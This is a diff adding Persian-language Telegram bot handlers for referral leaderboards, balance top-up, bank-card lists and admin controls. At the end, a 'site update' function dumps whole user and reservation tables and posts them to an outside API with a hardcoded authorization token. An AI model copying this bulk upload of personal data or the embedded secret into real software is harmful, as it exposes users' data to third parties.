@@ -2027,3 +2027,524 @@ def combined_profile_view(message):
         send_error_to_admin(f"❌ خطا در پروفایل کاربر {chat_id}:\n{e}")
 
 
+@bot.message_handler(func=lambda message: message.text == "🎊 نفرات برتر")
+def gift(message):
+    if not is_bot_active():
+        return
+    
+    chat_id = message.from_user.id
+    must_join_channels = make_channel_id_keyboard()
+    try:
+        if is_member_in_all_channels(chat_id) or (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+            top_10_chat_ids = read_and_extract_top_users(settings.database)
+            user_id_1 = top_10_chat_ids[0]
+            user_id_2 = top_10_chat_ids[1]
+            user_id_3 = top_10_chat_ids[2]
+            user_id_4 = top_10_chat_ids[3]
+            user_id_5 = top_10_chat_ids[4]
+            user_id_6 = top_10_chat_ids[5]
+            user_id_7 = top_10_chat_ids[6]
+            user_id_8 = top_10_chat_ids[7]
+            user_id_9 = top_10_chat_ids[8]
+            user_id_10 = top_10_chat_ids[9]
+
+            user_invite_1 = search_user_invited_users(user_id_1)
+            user_invite_2 = search_user_invited_users(user_id_2)
+            user_invite_3 = search_user_invited_users(user_id_3)
+            user_invite_4 = search_user_invited_users(user_id_4)
+            user_invite_5 = search_user_invited_users(user_id_5)
+            user_invite_6 = search_user_invited_users(user_id_6)
+            user_invite_7 = search_user_invited_users(user_id_7)
+            user_invite_8 = search_user_invited_users(user_id_8)
+            user_invite_9 = search_user_invited_users(user_id_9)
+            user_invite_10 = search_user_invited_users(user_id_10)
+
+            user_name_1 = search_user_first_name(user_id_1)
+            user_name_2 = search_user_first_name(user_id_2)
+            user_name_3 = search_user_first_name(user_id_3)
+            user_name_4 = search_user_first_name(user_id_4)
+            user_name_5 = search_user_first_name(user_id_5)
+            user_name_6 = search_user_first_name(user_id_6)
+            user_name_7 = search_user_first_name(user_id_7)
+            user_name_8 = search_user_first_name(user_id_8)
+            user_name_9 = search_user_first_name(user_id_9)
+            user_name_10 = search_user_first_name(user_id_10)
+
+            user_username_1 = f"https://t.me/{(search_user_username(user_id_1))}"
+            user_username_2 = f"https://t.me/{(search_user_username(user_id_2))}"
+            user_username_3 = f"https://t.me/{(search_user_username(user_id_3))}"
+            user_username_4 = f"https://t.me/{(search_user_username(user_id_4))}"
+            user_username_5 = f"https://t.me/{(search_user_username(user_id_5))}"
+            user_username_6 = f"https://t.me/{(search_user_username(user_id_6))}"
+            user_username_7 = f"https://t.me/{(search_user_username(user_id_7))}"
+            user_username_8 = f"https://t.me/{(search_user_username(user_id_8))}"
+            user_username_9 = f"https://t.me/{(search_user_username(user_id_9))}"
+            user_username_10 = f"https://t.me/{(search_user_username(user_id_10))}"
+
+            top_users_button = [[InlineKeyboardButton("تعداد دعوت شده", callback_data='noop'),
+                                 InlineKeyboardButton("دعوت کننده برتر", callback_data='noop'),
+                                 InlineKeyboardButton("🏆", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_1, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_1, url=user_username_1),
+                                 InlineKeyboardButton("🥇", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_2, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_2, url=user_username_2),
+                                 InlineKeyboardButton("🥈", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_3, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_3, url=user_username_3),
+                                 InlineKeyboardButton("🥉", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_4, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_4, url=user_username_4),
+                                 InlineKeyboardButton("4", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_5, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_5, url=user_username_5),
+                                 InlineKeyboardButton("5", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_6, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_6, url=user_username_6),
+                                 InlineKeyboardButton("6", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_7, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_7, url=user_username_7),
+                                 InlineKeyboardButton("7", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_8, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_8, url=user_username_8),
+                                 InlineKeyboardButton("8", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_9, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_9, url=user_username_9),
+                                 InlineKeyboardButton("9", callback_data='noop')],
+                                [InlineKeyboardButton(user_invite_10, callback_data='noop'),
+                                 InlineKeyboardButton(user_name_10, url=user_username_10),
+                                 InlineKeyboardButton("10", callback_data='noop')]]
+
+            top_users_keyboard = InlineKeyboardMarkup(top_users_button)
+
+            # ساخت کپشن با سه نفر اول و هایپرلینک نام و آیدی
+            caption = (
+                "🏆 <b>آمار کلی نفرات برتر:</b>\n\n"
+                f"🥇 <a href=\"{user_username_1}\">{user_name_1}</a>\n"
+                f"🥈 <a href=\"{user_username_2}\">{user_name_2}</a>\n"
+                f"🥉 <a href=\"{user_username_3}\">{user_name_3}</a>\n\n"
+                f"🆔 {settings.bot_id}"
+            )
+            bot.send_message(
+                chat_id=chat_id,
+                text=caption,
+                reply_markup=top_users_keyboard,
+                parse_mode="HTML",
+                disable_web_page_preview=True
+            )
+        else:
+            bot.send_message(message.chat.id, text=""" 
+جهت استفاده از ربات و حمایت از تیم ما لطفا در چنل های زیر عضو باش
+
+⭕️بعد از عضویت دکمه "✅ عضو شدم" رو بزنید.""", reply_markup=must_join_channels)
+
+    except Exception as e:
+        bot.send_message(settings.matin, text=f"{e}\n\n for {message.chat.id}")
+
+
+@bot.message_handler(func=lambda message: message.text == "☎️ پشتیبانی")
+def back(message):
+    if not is_bot_active():
+        return
+    
+    chat_id = message.chat.id
+    bot.send_message(chat_id, f"""
+جهت ارتباط با پشتیبانی با آیدی زیر در ارتباط باشید:
+
+☎️ {admin_username}
+""", reply_markup=main_markup)
+    
+    
+@bot.message_handler(func=lambda message: message.text == "🎁 دعوت دوستان")
+def get_invite_link(message):
+    if not is_bot_active():
+        return
+    
+    chat_id = message.from_user.id
+    must_join_channels = make_channel_id_keyboard()
+    try:
+        if is_member_in_all_channels(chat_id) or (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+
+            chat_id = message.from_user.id
+            PHOTO_PATH1 = "gift.png"
+
+            user_bot_link_button = [
+                [InlineKeyboardButton("🎮 دریافت تخفیف رایگان 🎮", url=f"{settings.bot_link}?start=invite_{chat_id}")]]
+            user_bot_link_keyboard = InlineKeyboardMarkup(user_bot_link_button)
+
+            with open(PHOTO_PATH1, 'rb') as photo:
+                bot.send_photo(chat_id, photo, caption=f"""
+<b>💎 با دعوت دوستات تخفیف دریافت کن!</b>
+
+همین الان وارد ربات شو و با دعوت دوستات تخفیف ویژه بگیر ... 👇🏻
+
+👉🏻 {settings.bot_link}?start=invite_{chat_id}
+""", parse_mode="HTML", reply_markup=user_bot_link_keyboard)
+
+        else:
+            bot.send_message(message.chat.id, text=""" 
+جهت استفاده از ربات و دریافت شارژ تو کانال زیر عضو باش
+
+⭕️بعد از عضویت دکمه "✅ عضو شدم" رو بزن.
+""", reply_markup=must_join_channels)
+
+    except Exception as e:
+        bot.send_message(settings.matin, text=f"{e}\n\n for {message.chat.id}")
+
+
+
+@bot.message_handler(func=lambda message: message.text == "💳 افزایش موجودی")
+def get_payment_handel_panel(message):
+    if not is_bot_active():
+        return
+    
+    chat_id = message.from_user.id
+    must_join_channels = make_channel_id_keyboard()
+    try:
+        if is_member_in_all_channels(chat_id) or (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+            bot.send_message(chat_id, text=f"""
+<b>✅ اکنون می‌توانید حساب خود را شارژ کنید.</b>
+------
+یکی از مبلغ شارژ را انتخاب کنید
+
+<b>⛓️ • آیدی عددی شما:</b> {chat_id}
+<b>🏡 • موجودی حساب:</b> {search_user_money(chat_id)}
+""", reply_markup=keyboard_payment_button, parse_mode="HTML")
+
+        else:
+            bot.send_message(message.chat.id, text=""" 
+جهت استفاده از ربات و دریافت شارژ تو کانال زیر عضو باش
+
+⭕️بعد از عضویت دکمه "✅ عضو شدم" رو بزن.
+""", reply_markup=must_join_channels)
+
+    except Exception as e:
+        bot.send_message(settings.matin, text=f"{e}\n\n for {message.chat.id}")
+
+
+@bot.message_handler(func=lambda msg: msg.text == "➕ ثبت شماره کارت جدید")
+def start_card_register(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        bot.send_message(message.chat.id, "👤 لطفاً مشخصات صاحب کارت و نام بانک را ارسال کنید.\n(مثال: علی رضایی - بانک ملت)", reply_markup=back_markup)
+        bot.register_next_step_handler(message, ask_card_number, [])
+    
+
+@bot.message_handler(func=lambda msg: msg.text == "📋 مشاهده شماره کارت‌ها")
+def show_card_list(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        text = format_card_list()
+        bot.send_message(chat_id, text, parse_mode="HTML")
+
+@bot.message_handler(func=lambda message: message.text == "❌ حذف شماره کارت")
+def delete_card_menu(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        keyboard = make_delete_card_keyboard()
+        bot.send_message(chat_id, "🔻 جهت حذف، بر روی شماره کارت مورد نظر کلیک کنید:", reply_markup=keyboard)
+
+
+@bot.message_handler(func=lambda message: message.text == "⚙️ افزایش اعتبار")
+def button(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        msg = bot.send_message(message.chat.id, 'مقدار اعتبار مورد نطر را وارد نمایید:', reply_markup=back_markup)
+        bot.register_next_step_handler(msg, lambda message: up_user_money_by_admin_request(message.text, message))
+
+
+@bot.message_handler(func=lambda message: message.text == "🚫 حذف لینک آپلودر")
+def request_tracking_code(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        
+        bot.reply_to(message, "لطفاً لینک مربوط به فایل آپلود شده را ارسال کنید.", reply_markup=back_markup)
+        bot.register_next_step_handler(message, handle_delete_request)
+
+
+@bot.message_handler(func=lambda message: message.text == "📤 آپلود فایل جدید")
+def request_file(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        bot.reply_to(message, "فایل مورد نظر خود را جهت تبدیل به لینک ارسال کنید:", reply_markup=back_markup)
+        bot.register_next_step_handler(message, handle_file)
+
+
+@bot.message_handler(func=lambda message: message.text == "🖇 ایجاد دکمه شیشه ای")
+def ask_for_content(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        keyboards[chat_id] = []  # ایجاد لیست جدید برای ذخیره کلیدها
+        msg = bot.send_message(chat_id, "لطفاً محتوایی که می‌خواهید به کلید شیشه‌ای متصل کنید (متن، تصویر، ویدیو یا کپشن) را ارسال کنید.", reply_markup=back_markup)
+        bot.register_next_step_handler(msg, handle_content)
+    else:
+        bot.send_message(chat_id, "شما دسترسی لازم برای این عملیات را ندارید.", reply_markup=main_markup)
+        
+
+@bot.message_handler(func=lambda message: message.text in ["برگشت 🔙"])
+def process_consent(message):
+    if not is_bot_active():
+        return
+    
+    chat_id = message.chat.id
+    bot.send_message(chat_id, "به منوی اصلی برگشتید!", reply_markup=main_markup)
+
+
+@bot.message_handler(func=lambda message: message.text == "پنل")
+def new_Aghahi(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        bot.send_message(message.chat.id, text=f"به پنل ادمین متصل شدید", reply_markup=admin_markup)
+
+
+@bot.message_handler(func=lambda message: message.text == "برگشت به پنل ادمین 🔙")
+def new_Aghahi(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        bot.send_message(message.chat.id, text=f"به پنل ادمین متصل شدید", reply_markup=admin_markup)
+
+        
+@bot.message_handler(func=lambda message: message.text == "➕ افزودن کانال")
+def admin_keyboard_set_tablighat(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        temp_data[chat_id] = {}
+        msg = bot.send_message(chat_id, "لطفاً یک نام کوتاه برای دکمه شیشه‌ای (حداکثر ۴۰ کاراکتر) ارسال کنید:", reply_markup=back_markup)
+        bot.register_next_step_handler(msg, get_button_name)
+
+
+
+@bot.message_handler(func=lambda message: message.text == "➰ منوی کاربر عادی")
+def back(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        bot.send_message(message.chat.id,
+                         "به منوی کاربری عادی متصل شدید\n(جهت برگشتن به منوی ادمین مجددا /start را بزنید.)",
+                         reply_markup=main_markup)
+
+
+@bot.message_handler(func=lambda message: message.text == "❌ حذف کانال")
+def new_Aghahi(message):
+    chat_id = message.chat.id
+    keyboard = make_delete_channel_id_keyboard()
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        bot.send_message(message.chat.id, "جهت حذف، بر روی آیدی کانال مورد نظر کلیک کنید.", reply_markup=keyboard)
+
+
+@bot.message_handler(func=lambda message: message.text == "📊 آمار ربات")
+def button(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        all_user_num = search_all_users()
+        bot.send_message(message.chat.id, f"""
+آمار ربات
+
+تعداد کل کاربران ربات: {all_user_num}
+
+🆔 {settings.bot_id}
+""")
+
+
+@bot.message_handler(func=lambda message: message.text == "📢 پیام همگانی")
+def admin_keyboard_set_tablighat(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        msg = bot.send_message(message.chat.id, "فایل یا پیام خود را جهت ارسال همگانی ارسال نمایید.",
+                               reply_markup=back_markup)
+        bot.register_next_step_handler(msg, lambda user_message: confirm_send_all_users(user_message))
+
+
+@bot.message_handler(func=lambda message: message.text == "دیتا")
+def new_Aghahi(message):
+    if str(message.chat.id) == settings.matin:
+        try:
+            with open(settings.database, "rb") as f:
+                bot.send_document(settings.matin, f)
+
+            bot.send_message(message.chat.id, text="آخرین اطلاعات آپدیت شد.", reply_markup=admin_markup)
+        except Exception as e:
+            send_error_to_admin(traceback.format_exc())
+
+
+@bot.message_handler(func=lambda message: message.text == "➕ افزودن ادمین")
+def admin_keyboard_set_tablighat(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list):
+        msg = bot.send_message(message.chat.id, "آیدی عددی ادمین را ارسال نمایید.", reply_markup=back_markup)
+        bot.register_next_step_handler(msg, lambda user_message: save_new_admin(user_message.text, user_message))
+
+
+@bot.message_handler(func=lambda message: message.text == "❌ حذف ادمین")
+def new_Aghahi(message):
+    chat_id = message.chat.id
+    keyboard = make_delete_admin_list_keyboard()
+    if (int(chat_id) in settings.admin_list):
+        bot.send_message(message.chat.id, "جهت حذف، بر روی آیدی عددی ادمین مورد نظر کلیک کنید.", reply_markup=keyboard)
+        
+@bot.message_handler(func=lambda message: message.text == "⚙️ تنظیم مبلغ پاداش دعوت")
+def handle_set_invite_diamond(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        msg = bot.send_message(
+            chat_id,
+            "💎 <b>تعداد تومان‌های جایزه برای هر دعوت را ارسال کنید:</b>\n\nمثلاً: <code>5</code>",
+            reply_markup=back_markup,
+            parse_mode="HTML"
+        )
+        bot.register_next_step_handler(msg, save_invite_diamond_count)
+    else:
+        bot.send_message(
+            chat_id,
+            "⛔️ <b>شما دسترسی لازم برای انجام این عملیات را ندارید.</b>",
+            reply_markup=main_markup,
+            parse_mode="HTML"
+        )
+
+        
+@bot.message_handler(func=lambda message: message.text == "👤 تنظیم آیدی پشتیبانی")
+def set_admin_username(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        msg = bot.send_message(chat_id, "لطفاً آیدی جدید پشتیبانی (مثلاً @username) را ارسال کنید:", reply_markup=back_markup)
+        bot.register_next_step_handler(msg, save_admin_username)
+    else:
+        bot.send_message(chat_id, "شما دسترسی لازم برای این عملیات را ندارید.", reply_markup=main_markup)
+
+
+@bot.message_handler(func=lambda message: message.text == "تنظیم کانال اطلاع رسانی")
+def set_charge_doc_channel(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        msg = bot.send_message(chat_id, "لطفاً یک پیام از کانال اطلاع رسانی را به ربات فوروارد کنید (ربات باید ادمین کانال باشد).", reply_markup=back_markup)
+        bot.register_next_step_handler(msg, handle_forwarded_charge_doc_channel)
+    else:
+        bot.send_message(chat_id, "شما دسترسی لازم برای این عملیات را ندارید.", reply_markup=main_markup)
+
+
+@bot.message_handler(func=lambda message: message.text in ["🔴 خاموش/روشن ربات"])
+def toggle_bot_active(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        current = is_bot_active()
+        set_bot_active(not current)
+        status = "روشن" if not current else "خاموش"
+        bot.send_message(chat_id, f"وضعیت ربات به <b>{status}</b> تغییر یافت.", parse_mode="HTML", reply_markup=admin_markup)
+    else:
+        bot.send_message(chat_id, "شما دسترسی لازم برای این عملیات را ندارید.", reply_markup=main_markup)
+
+
+@bot.message_handler(func=lambda message: message.text in ["🟢 خاموش/روشن احراز هویت"])
+def toggle_verify_active(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        current = is_verify_active()
+        set_verify_active(not current)
+        status = "روشن" if not current else "خاموش"
+        bot.send_message(chat_id, f"وضعیت احراز هویت به <b>{status}</b> تغییر یافت.", parse_mode="HTML", reply_markup=admin_markup)
+    else:
+        bot.send_message(chat_id, "شما دسترسی لازم برای این عملیات را ندارید.", reply_markup=main_markup)
+
+@bot.message_handler(func=lambda message: message.text == "🟢 بروزرسانی اطلاعات سایت 🟢")
+def new_Aghahi(message):
+    chat_id = message.chat.id
+    if (int(chat_id) in settings.admin_list) or (int(chat_id) in get_admin_ids()):
+        update_server_any_thing()
+        bot.send_message(message.chat.id, "اطلاعات سایت شما با موفقیت بروزرسانی شد.", reply_markup=admin_markup)
+        
+
+@bot.message_handler(func=lambda message: message.chat.type == 'private', 
+                     content_types=['text','audio', 'document', 'photo', 'sticker', 
+                                    'video', 'video_note', 'voice','location', 
+                                    'contact', 'venue', 'animation'])
+def fallback_non_text(message):
+    if not is_bot_active():
+        return
+    
+    chat_id = message.chat.id
+    if (int(chat_id) not in settings.admin_list) or (int(chat_id) not in get_admin_ids()):
+        bot.send_message(
+            message.chat.id,
+            text=f"""
+<b>✨ دوست عزیز، متوجه منظورت نشدم!</b>
+این بات طراحی شده تا کار مشخصی رو انجام بده. اگر کاری داری یا سوالی داری:
+
+به پشتیبانی مجموعه پیام ارسال کنید؛ در خدمتتون هستیم ❤️⬇️: 
+👉 {admin_username}
+""",
+        parse_mode="HTML",
+        reply_markup=main_markup,
+        disable_web_page_preview=True)
+
+
+@bot.chat_member_handler()
+def handle_user_leave(update: ChatMemberUpdated):
+    if not is_bot_active():
+        return
+    
+    chat_id = str(update.chat.id)
+    user = update.from_user
+    old_status = update.old_chat_member.status
+    new_status = update.new_chat_member.status
+    MONITORED_CHANNELS = get_must_join_channel_ids()
+
+
+    if chat_id in MONITORED_CHANNELS:
+        if old_status in ('member', 'administrator', 'creator') and new_status == 'left':
+            inviter_chatid = str(update.new_chat_member.inviter.id) if update.new_chat_member.inviter else None
+            try:
+                must_join_keyboard = make_channel_id_keyboard_invited_link(f"invite_{inviter_chatid}")
+                text = (
+                    f"👋 سلام {user.first_name}! متأسفانه دیدم کانال‌مون رو ترک کردی 😔\n"
+                    "🌟 خیلی خوشحال می‌شیم اگه دوباره به جمع‌مون برگردی و از مطالب جدید و ویژه بهره‌مند بشی 🤗\n"
+                    "🔗 کافیه روی دکمه زیر کلیک کنی و به ما ملحق بشی!👇👇"
+                )
+                bot.send_message(user.id, text, reply_markup=must_join_keyboard, parse_mode="HTML")
+            except Exception:
+                pass
+
+
+def update_server_any_thing():
+    try:
+        db_path = settings.database
+
+        # جداول موردنظر
+        tables = [
+            "users",
+            "user_info",
+            "staff",
+            "services",
+            "reservations"
+        ]
+
+        def dump_table(conn, table):
+            c = conn.cursor()
+            c.execute(f"SELECT * FROM {table}")
+            rows = c.fetchall()
+            colnames = [desc[0] for desc in c.description]
+            return [dict(zip(colnames, row)) for row in rows]
+
+        with sqlite3.connect(db_path) as conn:
+            all_tables = {table: dump_table(conn, table) for table in tables}
+
+        payload = {
+            "database_name": db_path,
+            "tables": all_tables
+        }
+
+        headers = {"Authorization": ";suirw[gjvno;hwiw[ue99348tylulig;]]"}
+
+        try:
+            resp = requests.post(
+                "https://api.telbotland.ir/api/sync_full_data",
+                json=payload,
+                headers=headers,
+                timeout=10
+            )
+            print("Response:", resp.text)
+        except Exception as e:
+            print("Error:", e)
+        pass
+    except Exception as e:
+        send_error_to_admin(f"❌ خطا در به‌روزرسانی سرور:\n<code>{e}</code>", parse_mode="HTML")
+    
+bot.infinity_polling(allowed_updates=['message', 'callback_query', 'chat_member'])
